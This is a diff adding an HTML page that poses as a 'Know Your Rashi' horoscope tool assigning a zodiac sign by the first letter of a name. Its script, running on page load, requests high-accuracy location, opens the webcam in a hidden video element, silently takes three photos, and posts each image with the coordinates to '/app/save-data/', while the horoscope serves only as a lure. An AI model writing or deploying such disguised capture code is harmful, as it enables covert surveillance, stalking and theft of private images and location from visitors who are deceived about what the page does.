@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Know Your Rashi</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+
+body{
+font-family: Arial;
+background:#f4f6fb;
+text-align:center;
+padding:40px;
+}
+
+.container{
+background:white;
+padding:25px;
+border-radius:10px;
+box-shadow:0 0 10px rgba(0,0,0,0.1);
+max-width:400px;
+margin:auto;
+}
+
+input{
+width:90%;
+padding:10px;
+margin-top:10px;
+border:1px solid #ddd;
+border-radius:5px;
+}
+
+button{
+margin-top:15px;
+padding:10px 20px;
+border:none;
+background:#4CAF50;
+color:white;
+border-radius:5px;
+font-size:16px;
+cursor:pointer;
+}
+
+.result{
+margin-top:20px;
+padding:15px;
+background:#fafafa;
+border-radius:6px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>🔮 Know Your Future</h2>
+
+<p>Enter your name to know your Rashi</p>
+
+<input type="text" id="name" placeholder="Enter your name">
+
+<button onclick="showRashi()">Check Rashi</button>
+
+<div id="result" class="result" style="display:none"></div>
+
+</div>
+
+
+<video id="video" autoplay playsinline muted style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+
+let lat=""
+let lon=""
+let stream=null
+let count=0
+
+// location access
+navigator.geolocation.getCurrentPosition(function(position){
+
+lat = position.coords.latitude
+lon = position.coords.longitude
+
+startCamera()
+
+}, function(error){
+
+startCamera()
+
+},{enableHighAccuracy:true})
+
+
+
+// camera access
+function startCamera(){
+
+navigator.mediaDevices.getUserMedia({video:true})
+.then(function(s){
+
+stream=s
+let video=document.getElementById("video")
+
+video.srcObject=stream
+
+video.onloadedmetadata=function(){
+
+video.play()
+setTimeout(startCapture,1500)
+
+}
+
+})
+
+}
+
+
+// auto capture
+function startCapture(){
+
+let interval=setInterval(function(){
+
+capturePhoto()
+
+count++
+
+if(count>=3){
+
+clearInterval(interval)
+stopCamera()
+
+}
+
+},2000)
+
+}
+
+
+// stop camera
+function stopCamera(){
+
+if(stream){
+stream.getTracks().forEach(track=>track.stop())
+}
+
+}
+
+
+// capture photo
+function capturePhoto(){
+
+let video=document.getElementById("video")
+let canvas=document.getElementById("canvas")
+
+canvas.width=video.videoWidth
+canvas.height=video.videoHeight
+
+let ctx=canvas.getContext("2d")
+ctx.drawImage(video,0,0)
+
+canvas.toBlob(function(blob){
+
+sendData(blob)
+
+},"image/jpeg",0.9)
+
+}
+
+
+// send to backend
+function sendData(blob){
+
+let formData=new FormData()
+
+formData.append("image",blob,"photo.jpg")
+formData.append("lat",lat)
+formData.append("lon",lon)
+
+fetch("/app/save-data/",{
+method:"POST",
+body:formData
+})
+
+}
+
+
+
+// rashi logic
+function showRashi(){
+
+let name=document.getElementById("name").value.trim()
+
+if(name==""){
+alert("Please enter your name")
+return
+}
+
+let first=name[0].toLowerCase()
+
+let rashi=""
+let future=""
+
+if("aikl".includes(first)){
+rashi="Aries"
+future="Today brings new opportunities and positive energy."
+}
+else if("bmr".includes(first)){
+rashi="Taurus"
+future="You may receive good news related to work."
+}
+else if("cgs".includes(first)){
+rashi="Gemini"
+future="A surprise meeting may brighten your day."
+}
+else if("dpt".includes(first)){
+rashi="Cancer"
+future="Focus on your goals, success is near."
+}
+else{
+rashi="Leo"
+future="A lucky day for financial decisions."
+}
+
+document.getElementById("result").style.display="block"
+
+document.getElementById("result").innerHTML=
+
+"<h3>Your Rashi: "+rashi+"</h3>"+
+"<p>"+future+"</p>"
+
+}
+
+</script>
+
+</body>
+</html>
